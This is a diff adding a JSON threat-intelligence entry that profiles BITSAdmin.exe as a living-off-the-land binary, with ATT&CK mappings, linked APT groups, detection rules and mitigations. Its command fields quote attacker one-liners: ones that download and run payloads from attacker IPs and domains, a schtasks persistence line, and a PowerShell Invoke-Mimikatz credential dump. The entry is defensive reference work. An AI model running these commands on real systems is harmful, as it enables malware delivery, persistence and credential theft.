@@ -1,0 +1,119 @@
+{
+  "type": "lolbin",
+  "version": 1,
+  "id": "e5f272be-0171-44a2-bac9-122c03b57570",
+  "created_by_ref": "@Nounou_Mbeiri",
+  "created": "2023-08-17T00:00",
+  "modified": "2023-08-17T00:00",
+  "name": "BITSAdmin.exe",
+  "description": "BITSAdmin is a command line tool used to create and manage BITS Jobs.",
+  "Required_privilege": [
+    "User"
+  ],
+  "paths": [
+    "c:\\windows\\system32\\bitsadmin.exe",
+    "c:\\windows\\syswow64\\bitsadmin.exe"
+  ],
+  "hashe": "01AAB62D5799F75B0D69EB29C1CA6855",
+  "associated_kill_chain_phases": [
+    "TA0009:Persistence:T1197",
+    "TA0005:Defense Evasion:T1197",
+    "TA0008:Lateral Movement:T1570",
+    "TA0010:Exfiltration:T1048.003",
+    "TA0011:Command and Control:T1105"
+  ],
+  "capabilities": [
+    "Alternate data streams",
+    "Download",
+    "Copy",
+    "Execute",
+    "upload"
+  ],
+  "relationship": [
+    {
+      "associated_apts": [
+        "APT41",
+        "Leviathan",
+        "Tropic Trooper",
+        "HEXANE",
+        "Ferocious Kitten"
+      ],
+      "associated_campaigns": [
+        "N/A"
+      ],
+      "associated_commands": [
+        "cmd /c bitsadmin /transfer MyJob https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png C:\\Users\\Public\\11.png",
+        "cmd /c bitsadmin /transfer bbbb http://66.42.98[.]220:12345/test/install.bat C:\\Users\\Public\\install.bat",
+        "C:\\Windows\\System32\\cmd.exe %windir% /c explorer.exe & bitsadmin.exe /transfer /priority high hxxp://av.ka289cisce[.]org/rh72.bin %AppData%\file.exe & %AppData%\file.exe",
+        "cmd.exe /c bitsadmin /transfer <REDACTED> \\10.<REDACTED>\\share$\\<REDACTED>.exe C:\\Users\\<REDACTED>\\AppData\\Roaming\\<REDACTED>.exe"
+      ],
+      "pre_and_next_related_cmd": [
+        {
+          "pre_cmd_event": [
+            "schtasks /create /tn \\Microsoft\\Office\\OfficeAgentLogOn2016 /tr \"C:\\Users\\Public\\PublicLib\\MicrosoftUpdator.vbs\" /sc ONLOGON /ru [Redacted] /f",
+            "/usr/bin/ftp -o /tmp/un ftp://test:[redacted]\\@66.42.98[.]220/un",
+            "schtasks /create /s [REDACTED] /ru \"NT Authority\\System\" /tn [REDACTED] /tr \"c:\\windows\\explorer.exe\" /sc once /st",
+            "powershell \"IEX (New-Object Net.WebClient). DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds",
+            ""
+          ],
+          "next_cmd_event": [
+            ""
+          ]
+        }
+      ]
+    }
+  ],
+  "platforms": [
+    "windows"
+  ],
+  "detections": [
+    {
+      "eventsid": [
+        {
+          "sysmon": [
+            "T1197:process:process_creation:log_channel:Microsoft-Windows-Sysmon/Operational:log_provider:Microsoft-Windows-Sysmon:1",
+            "T1197:network_traffic:network_connection_creation:log_channel:Microsoft-Windows-Sysmon/Operational:log_provider:Microsoft-Windows-Sysmon:3"
+          ],
+          "windows": [
+            "T1197:process:process_creation:log_channel:Security:log_provider:Microsoft-Windows-Security-Auditing:4688",
+            "T1197:network_traffic:network_connection_creation:log_channel:Security:log_provider:Microsoft-Windows-Security-Auditing:5156",
+            "T1197:network_traffic:network_connection_creation:log_channel:Security:log_provider:Microsoft-Windows-Security-Auditing:5157"
+          ]
+        }
+      ],
+      "sigma_rules": [
+        "https://raw.githubusercontent.com/SigmaHQ/sigma/master/rules/windows/process_creation/proc_creation_win_bitsadmin_download.yml",
+        "https://raw.githubusercontent.com/SigmaHQ/sigma/master/rules/windows/process_creation/proc_creation_win_bitsadmin_download_susp_extensions.yml",
+        "https://raw.githubusercontent.com/SigmaHQ/sigma/master/rules/windows/process_creation/proc_creation_win_bitsadmin_download_file_sharing_domains.yml",
+        "https://raw.githubusercontent.com/SigmaHQ/sigma/master/rules/windows/process_creation/proc_creation_win_bitsadmin_potential_persistence.yml"
+      ],
+      "other_rules": [
+        "https://raw.githubusercontent.com/splunk/security_content/develop/detections/endpoint/bitsadmin_download_file.yml",
+        "https://raw.githubusercontent.com/splunk/security_content/develop/dev/endpoint/office_product_spawning_bitsadmin.yml",
+        "https://raw.githubusercontent.com/elastic/detection-rules/main/rules_building_block/command_and_control_bitsadmin_activity.toml"
+      ]
+    }
+  ],
+  "related_CVE": [
+    "CVE-2017-11882",
+    "CVE-2018-0802",
+    "CVE-2019-19781"
+  ],
+  "mitigations": [
+    "Modify network and/or host firewall rules, as well as other network controls, to only allow legitimate BITS traffic.",
+    "Consider reducing the default BITS job lifetime in Group Policy or by editing the JobInactivityTimeout and MaxDownloadTime Registry values in HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\BITS.",
+    "Consider limiting access to the BITS interface to specific users or groups.",
+    "Enforce proxies and use dedicated servers for services such as DNS and only allow those systems to communicate over respective ports/protocols instead of all systems within a network.",
+    "Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary command and control infrastructure and malware can be used to mitigate activity at the network level.",
+    "Follow best practices for network firewall configurations to allow only necessary ports and traffic to enter and exit the network.",
+    "Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware or unusual data transfer over known protocols like FTP can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.",
+    "Consider using the host firewall to restrict file sharing communications such as SMB.",
+    "Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware or unusual data transfer over known tools and protocols like FTP can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific obfuscation technique used by a particular adversary or tool, and will likely be different across various malware families and versions."
+  ],
+  "references": [
+    "https://attack.mitre.org/software/S0190",
+    "https://app.tidalcyber.com/software/52a20d3d-1edd-4f17-87f0-b77c67d260b4-BITSAdmin",
+    "https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/",
+    "https://strontic.github.io/xcyclopedia/library/bitsadmin.exe-01AAB62D5799F75B0D69EB29C1CA6855.html"
+  ]
+}
